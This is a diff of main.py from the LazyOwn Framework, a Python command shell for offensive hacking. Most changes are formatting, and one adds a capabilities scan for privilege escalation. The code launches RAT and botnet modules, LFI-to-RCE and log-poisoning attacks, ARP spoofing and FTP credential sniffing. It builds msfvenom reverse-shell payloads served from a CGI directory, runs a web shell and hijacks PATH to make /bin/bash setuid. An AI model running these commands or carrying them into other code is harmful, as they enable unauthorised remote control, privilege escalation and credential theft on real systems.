@@ -1,9 +1,9 @@
-#!/usr/bin/env python3 
-#_*_ coding: utf8 _*_
+#!/usr/bin/env python3
+# _*_ coding: utf8 _*_
 """
 main.py
 
-Autor: Gris Iscomeback 
+Autor: Gris Iscomeback
 Correo electrónico: grisiscomeback[at]gmail[dot]com
 Fecha de creación: 09/06/2024
 Licencia: GPL v3
@@ -19,6 +19,7 @@ LazyOwn Framework SHELL
 ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
 
 """
+
 import os
 import sys
 import subprocess
@@ -52,12 +53,15 @@ BANNER = """
 """
 print(BANNER)
 
+
 def signal_handler(sig, frame):
     global should_exit
     print("\n [<-] para salir usar el comando exit ...")
     should_exit = True
 
+
 signal.signal(signal.SIGINT, signal_handler)
+
 
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
@@ -88,23 +92,23 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
             "attacker_ip": None,
             "reverse_shell_ip": None,
             "reverse_shell_port": None,
-            "path":"/",
+            "path": "/",
             "rhost": None,
             "lhost": None,
             "rport": 1337,
             "lport": 1337,
             "rat_key": "82e672ae054aa4de6f042c888111686a",
-            "startip":"192.168.1.1",
-            "endip":"192.168.1.254",
-            "spoof_ip":"185.199.110.153",
-            "device":"eth0",
-            "email_from":"email@gmail.com",
-            "email_to":"email@gmail.com",
-            "email_username":"email@gmail.com",
-            "email_password":"pa$$w0rd",
-            "smtp_server":"smtp.server.com",
-            "smtp_port":"587",
-            "field": "page"
+            "startip": "192.168.1.1",
+            "endip": "192.168.1.254",
+            "spoof_ip": "185.199.110.153",
+            "device": "eth0",
+            "email_from": "email@gmail.com",
+            "email_to": "email@gmail.com",
+            "email_username": "email@gmail.com",
+            "email_password": "pa$$w0rd",
+            "smtp_server": "smtp.server.com",
+            "smtp_port": "587",
+            "field": "page",
         }
         self.scripts = [
             "lazysearch",
@@ -132,7 +136,7 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
             "lazymsfvenom",
             "lazypathhijacking",
             "lazyarpspoofing",
-            "lazyftpsniff"
+            "lazyftpsniff",
         ]
         self.output = ""
 
@@ -145,9 +149,8 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         except Exception as e:
             self.output = str(e)
 
-
     def do_set(self, line):
-        """ Set a parameter value. Usage: set <parameter> <value> """
+        """Set a parameter value. Usage: set <parameter> <value>"""
         args = shlex.split(line)
         if len(args) != 2:
             print("[?] Usage: set <parameter> <value>")
@@ -161,18 +164,18 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
             print(f"[?] Unknown parameter: {param}")
 
     def do_show(self, line):
-        """ Show the current parameter values """
+        """Show the current parameter values"""
         for param, value in self.params.items():
             print(f"{param}: {value}")
 
     def do_list(self, line):
-        """ List all available scripts """
+        """List all available scripts"""
         print("Available scripts to run:")
         for script in self.scripts:
             print(f"- {script}")
 
     def do_run(self, line):
-        """ Run a specific LazyOwn script """
+        """Run a specific LazyOwn script"""
         args = shlex.split(line)
         if not args:
             print("[?] Usage: run <script_name>")
@@ -215,35 +218,50 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
 
     def run_lazysniff(self):
         env = os.environ.copy()
-        env['LANG'] = 'en_US.UTF-8'
-        env['TERM'] = 'xterm-256color'
+        env["LANG"] = "en_US.UTF-8"
+        env["TERM"] = "xterm-256color"
         device = self.params["device"]
-        subprocess.run(["python3", "modules/lazysniff.py", "-i", device], env=env, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)
+        subprocess.run(
+            ["python3", "modules/lazysniff.py", "-i", device],
+            env=env,
+            stdin=sys.stdin,
+            stdout=sys.stdout,
+            stderr=sys.stderr,
+        )
 
     def run_lazyftpsniff(self):
         device = self.params["device"]
         env = os.environ.copy()
-        env['LANG'] = 'en_US.UTF-8'
-        env['TERM'] = 'xterm-256color'
+        env["LANG"] = "en_US.UTF-8"
+        env["TERM"] = "xterm-256color"
         if not device:
             print("device must be set to choice the interface")
             return
         subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])
+
     def run_lazynetbios(self):
-        
         startip = self.params["startip"]
         endip = self.params["endip"]
         spoof_ip = self.params["spoof_ip"]
         subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])
 
     def run_lazyhoneypot(self):
-        
         email_from = self.params["email_from"]
         email_to = self.params["email_to"]
         email_username = self.params["email_username"]
         email_password = self.params["email_password"]
-        self.run_script("modules/lazyhoneypot.py", "--email_from", email_from, "--email_to", email_to, "--email_username", email_username, "--email_password", email_password)
-    
+        self.run_script(
+            "modules/lazyhoneypot.py",
+            "--email_from",
+            email_from,
+            "--email_to",
+            email_to,
+            "--email_username",
+            email_username,
+            "--email_password",
+            email_password,
+        )
+
     def run_lazygptcli(self):
         prompt = self.params["prompt"]
         api_key = self.params["api_key"]
@@ -261,6 +279,7 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
             return
         os.environ["GROQ_API_KEY"] = api_key
         self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)
+
     def run_lazymetaextract0r(self):
         path = self.params["path"]
         if not path:
@@ -275,7 +294,15 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not lhost or not lport or not rat_key:
             print("[?] lhost and lport and rat_key must be set")
             return
-        self.run_script("modules/lazyownclient.py", "--host", lhost, "--port", str(lport), "--key", rat_key)
+        self.run_script(
+            "modules/lazyownclient.py",
+            "--host",
+            lhost,
+            "--port",
+            str(lport),
+            "--key",
+            rat_key,
+        )
 
     def run_lazyownrat(self):
         rhost = self.params["rhost"]
@@ -284,7 +311,15 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not rhost or not rport or not rat_key:
             print("[?] rhost and lport and rat_key must be set")
             return
-        self.run_script("modules/lazyownserver.py", "--host", rhost, "--port", str(rport), "--key", rat_key)
+        self.run_script(
+            "modules/lazyownserver.py",
+            "--host",
+            rhost,
+            "--port",
+            str(rport),
+            "--key",
+            rat_key,
+        )
 
     def run_lazybotnet(self):
         rhost = "0.0.0.0"
@@ -293,7 +328,15 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not rhost or not rport or not rat_key:
             print("[?] rhost and lport and rat_key must be set")
             return
-        self.run_script("modules/lazybotnet.py", "--host", rhost, "--port", str(rport), "--key", rat_key )
+        self.run_script(
+            "modules/lazybotnet.py",
+            "--host",
+            rhost,
+            "--port",
+            str(rport),
+            "--key",
+            rat_key,
+        )
 
     def run_lazylfi2rce(self):
         rhost = self.params["rhost"]
@@ -303,10 +346,31 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         field = self.params["field"]
         wordlist = self.params["wordlist"]
 
-        if not rhost or not rport or not lhost or not lport or not field or not wordlist:
+        if (
+            not rhost
+            or not rport
+            or not lhost
+            or not lport
+            or not field
+            or not wordlist
+        ):
             print("[?] rhost and rport field and lhost lport wordlist must be set")
             return
-        self.run_script("modules/lazylfi2rce.py", "--rhost", rhost, "--rport", str(rport), "--lhost", lhost, "--lport", str(lport), "--field", field, "--wordlist" , wordlist )
+        self.run_script(
+            "modules/lazylfi2rce.py",
+            "--rhost",
+            rhost,
+            "--rport",
+            str(rport),
+            "--lhost",
+            lhost,
+            "--lport",
+            str(lport),
+            "--field",
+            field,
+            "--wordlist",
+            wordlist,
+        )
 
     def run_lazylogpoisoning(self):
         rhost = self.params["rhost"]
@@ -315,7 +379,9 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not rhost or not lhost:
             print("[?] rhost and lhost must be set")
             return
-        self.run_script("modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost)
+        self.run_script(
+            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
+        )
 
     def run_lazybotcli(self):
         rhost = "0.0.0.0"
@@ -324,8 +390,16 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not rhost or not rport or not rat_key:
             print("[?] rhost and lport and rat_key must be set")
             return
-        self.run_script("modules/lazybotcli.py", "--host", rhost, "--port", str(rport), "--key", rat_key)
-        
+        self.run_script(
+            "modules/lazybotcli.py",
+            "--host",
+            rhost,
+            "--port",
+            str(rport),
+            "--key",
+            rat_key,
+        )
+
     def run_lazyburpfuzzer(self):
         url = self.params["url"]
         method = self.params["method"]
@@ -338,14 +412,22 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         hide_code = self.params["hide_code"]
 
         command = [
-            "python3", "modules/lazyown_bprfuzzer.py",
-            "--url", url,
-            "--method", method,
-            "--headers", headers,
-            "--params", params,
-            "--data", data,
-            "--json_data", json_data,
-            "--proxy_port", str(proxy_port)
+            "python3",
+            "modules/lazyown_bprfuzzer.py",
+            "--url",
+            url,
+            "--method",
+            method,
+            "--headers",
+            headers,
+            "--params",
+            params,
+            "--data",
+            data,
+            "--json_data",
+            json_data,
+            "--proxy_port",
+            str(proxy_port),
         ]
         if wordlist:
             command.extend(["-w", wordlist])
@@ -380,7 +462,10 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not mode or not target_ip or not attacker_ip:
             print("[?] mode, target_ip, and attacker_ip must be set")
             return
-        os.system(f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}")
+        os.system(
+            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
+        )
+
     def run_lazymsfvenom(self):
         lhost = self.params["lhost"]
         lport = self.params["lport"]
@@ -388,9 +473,15 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         if not lhost or not lport:
             print("[?] lport and lhost mus be set")
             return
-        os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f elf > shell.elf")
-        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f exe > shell.exe")
-        os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f macho > shell.macho")
+        os.system(
+            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
+        )
+        os.system(
+            f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
+        )
+        os.system(
+            f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
+        )
         os.system("mv shell.* modules/cgi-bin")
         os.system("chmod +x modules/cgi-bin/*")
         print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
@@ -405,23 +496,27 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
         os.system(f"chmod +x /tmp/{binary_name}")
         os.system("export PATH=/tmp:$PATH")
-        print(f"[*] Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash")
+        print(
+            f"[*] Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
+        )
 
     def run_script(self, script_name, *args):
-        """ Run a script with the given arguments """
+        """Run a script with the given arguments"""
         command = ["python3", script_name] + [str(arg) for arg in args]
         self.run_command(command)
 
     def run_command(self, command):
-        """ Run a command and print output in real-time """
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        """Run a command and print output in real-time"""
+        process = subprocess.Popen(
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
         try:
-            for line in iter(process.stdout.readline, ''):
+            for line in iter(process.stdout.readline, ""):
                 self.output += line  # Agregar la salida a la variable self.output
-                print(line, end='')
-            for line in iter(process.stderr.readline, ''):
+                print(line, end="")
+            for line in iter(process.stderr.readline, ""):
                 self.output += line  # Agregar la salida de stderr también
-                print(line, end='')
+                print(line, end="")
             process.stdout.close()
             process.stderr.close()
             process.wait()
@@ -431,7 +526,7 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
             print("\n[Interrupted] Process terminated")
 
     def do_payload(self, line):
-        """ Load parameters from payload.json """
+        """Load parameters from payload.json"""
         try:
             with open("payload.json", "r") as f:
                 data = json.load(f)
@@ -445,31 +540,37 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
             print("[?] Error decoding payload.json")
 
     def do_exit(self, line):
-        """ Exit the LazyOwn shell """
+        """Exit the LazyOwn shell"""
         return True
+
     def do_fixperm(self, line):
-        """ Fix Perm LazyOwn shell """
+        """Fix Perm LazyOwn shell"""
         print("[f] Fix script perm")
         os.system("chmod +x modules/*.sh")
         os.system("chmod +x modules/cgi-bin/*")
 
     def do_lazywebshell(self, line):
-        """ LazyOwn shell """
+        """LazyOwn shell"""
         print("[r] Running Server in localhost:8080/cgi-bin/lazywebshell.py")
-        os.system("cd modules && python3 -m http.server 8080 --cgi &")    
+        os.system("cd modules && python3 -m http.server 8080 --cgi &")
+
+    def do_getcap(self, line):
+        """try get capabilities :)"""
+        print("[+] Try get capabilities")
+        os.system("getcap -r / 2>/dev/null")
 
     def do_lazypwn(self, line):
-        """LazyPwn  """
-        os.system("python3 modules/lazypwn.py")  
+        """LazyPwn"""
+        os.system("python3 modules/lazypwn.py")
 
     def do_fixel(self, line):
-        """LazyLfi2Rce  """
+        """LazyLfi2Rce"""
         os.system("dos2unix *")
         os.system("dos2unix modules/*")
-        os.system("dos2unix modules/cgi-bin/*")  
+        os.system("dos2unix modules/cgi-bin/*")
 
     def do_encrypt(self, line):
-        """ Encrypt a file using XOR. Usage: encrypt <file_path> <key> """
+        """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
         args = shlex.split(line)
         if len(args) != 2:
             print("[?] Usage: encrypt <file_path> <key>")
@@ -478,18 +579,18 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         file_path, key = args
 
         try:
-            with open(file_path, 'rb') as f:
+            with open(file_path, "rb") as f:
                 data = f.read()
 
             encrypted_data = xor_encrypt_decrypt(data, key)
-            with open(file_path + '.enc', 'wb') as f:
+            with open(file_path + ".enc", "wb") as f:
                 f.write(encrypted_data)
             print(f"[+] File encrypted: {file_path}.enc")
         except FileNotFoundError:
             print(f"[?] File not found: {file_path}")
 
     def do_decrypt(self, line):
-        """ Decrypt a file using XOR. Usage: decrypt <file_path> <key> """
+        """Decrypt a file using XOR. Usage: decrypt <file_path> <key>"""
         args = shlex.split(line)
         if len(args) != 2:
             print("[?] Usage: decrypt <file_path> <key>")
@@ -498,23 +599,27 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         file_path, key = args
 
         try:
-            with open(file_path, 'rb') as f:
+            with open(file_path, "rb") as f:
                 data = f.read()
 
             decrypted_data = xor_encrypt_decrypt(data, key)
-            with open(file_path.replace('.enc', ''), 'wb') as f:
+            with open(file_path.replace(".enc", ""), "wb") as f:
                 f.write(decrypted_data)
             print(f"[+] File decrypted: {file_path.replace('.enc', '')}")
         except FileNotFoundError:
             print(f"[?] File not found: {file_path}")
+
     def get_output(self):
-        """ Devuelve la salida acumulada """
+        """Devuelve la salida acumulada"""
         return self.output
+
+
 def xor_encrypt_decrypt(data, key):
-    """ XOR Encrypt or Decrypt data with a given key """
-    key_bytes = bytes(key, 'utf-8')
+    """XOR Encrypt or Decrypt data with a given key"""
+    key_bytes = bytes(key, "utf-8")
     key_length = len(key_bytes)
     return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])
+
 
 if __name__ == "__main__":
     LazyOwnShell().cmdloop()
